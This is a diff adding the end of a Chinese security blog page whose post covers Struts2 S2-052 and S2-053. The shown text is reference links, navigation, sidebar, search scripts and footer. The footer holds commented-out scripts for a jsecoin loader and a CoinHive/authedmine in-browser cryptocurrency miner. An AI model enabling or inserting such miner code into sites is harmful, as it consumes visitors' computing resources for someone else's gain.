+<li>Struts 2 S2-053漏洞分析（附POC）<br><a href="http://www.freebuf.com/vuls/147735.html" target="_blank" rel="external">http://www.freebuf.com/vuls/147735.html</a></li>
+<li>来自McAfee对s2-052的分析<br><a href="https://securingtomorrow.mcafee.com/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/" target="_blank" rel="external">https://securingtomorrow.mcafee.com/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/</a></li>
+<li>GCC 合并了我写的代码，从编译器开始解决安全问题。来自嘶吼，作者为吴潍浠<br><a href="http://www.4hou.com/binary/7688.html" target="_blank" rel="external">http://www.4hou.com/binary/7688.html</a></li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/20/windows认证机制以及常见密码获取工具分析/" rel="next" title="windows认证机制以及常见密码获取工具分析">
+                <i class="fa fa-chevron-left"></i> windows认证机制以及常见密码获取工具分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/09/14/UAC原理/" rel="prev" title="UAC原理">
+                UAC原理 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//kevien.github.io/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/avatar.jpg"
+               alt="M0rk" />
+          <p class="site-author-name" itemprop="name">M0rk</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">56</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">分类</span>
+              
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/kevien" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/TTByaw" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://weibo.com/wuyanzu" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#s2-052"><span class="nav-number">2.</span> <span class="nav-text">s2-052</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#S2-053"><span class="nav-number">3.</span> <span class="nav-text">S2-053</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#小结"><span class="nav-number">4.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reference"><span class="nav-number">5.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">M0rk</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+<br>
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+<!--
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+-->
+<!--
+<script type="text/javascript">
+!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/39357/kevien.github.io/optionalSubID/0/",s.parentNode.insertBefore(t,s)}();
+</script>
+-->
+
+<!--
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+  var miner = new CoinHive.Anonymous('uTu9h9LT1kVUk4O1UxyZAhd8uvoLLip5', {throttle: 0.3});
+
+  // Only start on non-mobile devices and if not opted-out
+  // in the last 14400 seconds (4 hours):
+  if (!miner.isMobile() && !miner.didOptOut(14400)) {
+    miner.start();
+  }
+</script>
+-->
+
+
+<!--<script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="https://kevien.github.io/static/api/js/canvas-nest.min.js"></script>-->
+<script src="https://kevien.github.io/static/api/js/love.js"></script>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+     <!-- 来必力City版安装代码 -->
+     <!--
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yOTU4MS82MTQ5">
+        <script type="text/javascript">
+         (function(d, s) {
+             var j, e = d.getElementsByTagName(s)[0];
+
+             if (typeof LivereTower === 'function') { return; }
+
+             j = d.createElement(s);
+             j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+             j.async = true;
+
+             e.parentNode.insertBefore(j, e);
+         })(document, 'script');
+        </script>
+      <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+      </div>
+      -->
+<!-- City版安装代码已完成 -->
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      $('#local-search-input').focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
